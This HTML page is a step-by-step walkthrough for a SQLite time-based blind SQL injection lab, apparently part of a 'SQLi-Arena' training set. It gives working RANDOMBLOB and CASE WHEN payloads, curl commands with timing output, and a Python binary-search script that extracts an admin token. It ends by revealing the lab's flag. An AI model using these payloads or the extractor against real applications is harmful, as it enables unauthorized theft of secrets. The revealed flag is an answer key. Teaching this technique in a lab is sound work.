<h4>Step 1: Test Normal Behavior</h4>
<p>Submit any token to see how the application responds.</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Baseline Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>test<br>
        <span class="prompt">SQL: </span>SELECT id FROM sessions WHERE session_id = 'test'<br><br>
        <span class="prompt">Response: </span><strong>Token checked.</strong><br><br>
        <span class="prompt">Input: </span>' OR 1=1 -- -<br>
        <span class="prompt">Response: </span><strong>Token checked.</strong><br><br>
        <span class="prompt">// Same response regardless of input -- no boolean signal!</span>
    </div>
</div>

<p>The response is always "Token checked.": no boolean oracle available. We need time-based injection.</p>

<h4>Step 2: Confirm RANDOMBLOB Delay</h4>
<p>
    SQLite has no <code>SLEEP()</code> function. Instead, <code>RANDOMBLOB(N)</code> generates
    N bytes of random data, causing CPU-based delay. Test the baseline vs delay.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. RANDOMBLOB Timing</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -w "\nTime: %{time_total}s" "http://localhost/SQLi-Arena/sqlite/lab5" \<br> --data-urlencode "token=test"<br>
        <span class="prompt">Response: </span>Token checked. -- <strong>Time: 0.013s</strong> (baseline)<br><br>
        <span class="prompt">$ </span>curl -s -w "\nTime: %{time_total}s" "http://localhost/SQLi-Arena/sqlite/lab5" \<br> --data-urlencode "token=' OR RANDOMBLOB(300000000) -- -"<br>
        <span class="prompt">Response: </span>Token checked. -- <strong>Time: 1.386s</strong> (300MB blob = ~1.4s delay!)
    </div>
</div>

<h4>Step 3: Conditional Time Oracle with CASE WHEN</h4>
<p>Use <code>CASE WHEN</code> to only trigger the delay when a condition is true.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. CASE WHEN Oracle</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// TRUE condition -- delay:</span><br>
        <span class="prompt">$ </span>curl -s -w "\nTime: %{time_total}s" "http://localhost/SQLi-Arena/sqlite/lab5" \<br> --data-urlencode "token=' OR (SELECT CASE WHEN 1=1 THEN RANDOMBLOB(300000000) ELSE 0 END) -- -"<br>
        <span class="prompt">Response: </span>Token checked. -- <strong>Time: 0.457s</strong> (slow = TRUE)<br><br>
        <span class="prompt">// FALSE condition -- no delay:</span><br>
        <span class="prompt">$ </span>curl -s -w "\nTime: %{time_total}s" "http://localhost/SQLi-Arena/sqlite/lab5" \<br> --data-urlencode "token=' OR (SELECT CASE WHEN 1=2 THEN RANDOMBLOB(300000000) ELSE 0 END) -- -"<br>
        <span class="prompt">Response: </span>Token checked. -- <strong>Time: 0.021s</strong> (fast = FALSE)
    </div>
</div>

<p>Clear distinction: TRUE &gt; 0.1s, FALSE &lt; 0.01s. The time oracle works.</p>

<h4>Step 4: Extract First Character</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. First Character Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Test if first char is 'F':</span><br>
        <span class="prompt">$ </span>curl -s -w "\nTime: %{time_total}s" "http://localhost/SQLi-Arena/sqlite/lab5" \<br> --data-urlencode "token=' OR (SELECT CASE WHEN substr((SELECT token FROM admin_tokens LIMIT 1),1,1)='F' THEN RANDOMBLOB(300000000) ELSE 0 END) -- -"<br>
        <span class="prompt">Response: </span>Token checked. -- <strong>Time: 0.463s</strong> (SLOW -- first char IS 'F')<br><br>
        <span class="prompt">// Test if first char is 'X':</span><br>
        <span class="prompt">$ </span>curl -s -w "\nTime: %{time_total}s" "http://localhost/SQLi-Arena/sqlite/lab5" \<br> --data-urlencode "token=' OR (SELECT CASE WHEN substr((SELECT token FROM admin_tokens LIMIT 1),1,1)='X' THEN RANDOMBLOB(300000000) ELSE 0 END) -- -"<br>
        <span class="prompt">Response: </span>Token checked. -- <strong>Time: 0.013s</strong> (FAST -- first char is NOT 'X')
    </div>
</div>

<h4>Step 5: Binary Search with unicode()</h4>
<p>
    Linear character search (~70 chars per position) is slow. Use <code>unicode()</code>
    for binary search (~7 requests per position).
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Binary Search Oracle</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// 'F' = ASCII 70. Binary search:</span><br>
        <span class="prompt">$ </span>curl -s -w "\nTime: %{time_total}s" "http://localhost/SQLi-Arena/sqlite/lab5" \<br> --data-urlencode "token=' OR (SELECT CASE WHEN unicode(substr((SELECT token FROM admin_tokens LIMIT 1),1,1))>70 THEN RANDOMBLOB(300000000) ELSE 0 END) -- -"<br>
        <span class="prompt">Response: </span>Time: 0.013s (FAST = FALSE, char &lt;= 70)<br><br>
        <span class="prompt">$ </span>curl -s -w "\nTime: %{time_total}s" "http://localhost/SQLi-Arena/sqlite/lab5" \<br> --data-urlencode "token=' OR (SELECT CASE WHEN unicode(substr((SELECT token FROM admin_tokens LIMIT 1),1,1))>69 THEN RANDOMBLOB(300000000) ELSE 0 END) -- -"<br>
        <span class="prompt">Response: </span>Time: 0.533s (SLOW = TRUE, char &gt; 69)<br><br>
        <span class="prompt">// char &gt; 69 AND char &lt;= 70 => char = 70 = 'F'</span>
    </div>
</div>

<h4>Step 6: Automation Script</h4>
<p>Time-based extraction requires automation. Threshold 0.1s works for local testing.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Python Time-Based Extractor</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>python3 -c "<br>
import requests, time<br>
url = 'http://TARGET/lab.php'<br>
flag = ''<br>
THRESHOLD = 0.1  # adjust for network latency<br>
BLOB_SIZE = 300000000<br>
<br>
for i in range(1, 30):<br>
&nbsp;&nbsp;low, high = 32, 126<br>
&nbsp;&nbsp;while low &lt;= high:<br>
&nbsp;&nbsp;&nbsp;&nbsp;mid = (low + high) // 2<br>
&nbsp;&nbsp;&nbsp;&nbsp;payload = (<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f\"' OR (SELECT CASE WHEN \"<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f\"unicode(substr((SELECT token FROM admin_tokens LIMIT 1),{i},1))>{mid} \"<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f\"THEN RANDOMBLOB({BLOB_SIZE}) ELSE 0 END) -- -\"<br>
&nbsp;&nbsp;&nbsp;&nbsp;)<br>
&nbsp;&nbsp;&nbsp;&nbsp;start = time.time()<br>
&nbsp;&nbsp;&nbsp;&nbsp;r = requests.get(url, params={<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'lab':'sqlite/lab5','mode':'black','token':payload<br>
&nbsp;&nbsp;&nbsp;&nbsp;})<br>
&nbsp;&nbsp;&nbsp;&nbsp;elapsed = time.time() - start<br>
&nbsp;&nbsp;&nbsp;&nbsp;if elapsed > THRESHOLD:<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;low = mid + 1<br>
&nbsp;&nbsp;&nbsp;&nbsp;else:<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;high = mid - 1<br>
&nbsp;&nbsp;if low > 126: break<br>
&nbsp;&nbsp;flag += chr(low)<br>
&nbsp;&nbsp;print(f'[+] Position {i}: {chr(low)} ({flag})')<br>
print(f'Flag: {flag}')<br>
"
    </div>
</div>

<h4>Step 7: Full Extraction Result</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 7. Extracted Flag</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">[+] </span>Position 1: F -> F<br>
        <span class="prompt">[+] </span>Position 2: L -> FL<br>
        <span class="prompt">[+] </span>Position 3: A -> FLA<br>
        <span class="prompt">[+] </span>Position 4: G -> FLAG<br>
        <span class="prompt">[+] </span>Position 5: { -> FLAG{<br>
        <span class="prompt">[+] </span>Position 6: s -> FLAG{s<br>
        <span class="prompt">...</span><br>
        <span class="prompt">[+] </span>Position 24: } -> FLAG{sq_r4nd0mbl0b_t1m3}<br><br>
        <span class="prompt">Flag: </span><strong>FLAG{sq_r4nd0mbl0b_t1m3}</strong>
    </div>
</div>

<h4>Step 8: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{sq_r4nd0mbl0b_t1m3}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Manual Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -w "\nTime: %{time_total}s" "http://localhost/SQLi-Arena/sqlite/lab5" \<br> --data-urlencode "token=' OR (SELECT CASE WHEN substr((SELECT token FROM admin_tokens LIMIT 1),1,1)='F' THEN RANDOMBLOB(300000000) ELSE 0 END) -- -"<br><br>
        <span class="prompt"># </span>Returns "Response: Token checked." with ~0.46s delay = TRUE (first char is 'F')
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> SQLite has no <code>SLEEP()</code> function: use <code>RANDOMBLOB(N)</code>
    for CPU-based delays instead. The blob size (300MB here) should be tuned for each target system.
    Wrap it in <code>CASE WHEN condition THEN RANDOMBLOB(N) ELSE 0 END</code> to create a conditional
    time oracle. Time-based injection is the last resort when there is no boolean or error signal.
    Network latency can cause false positives: use conservative thresholds and re-verify characters.
</div>
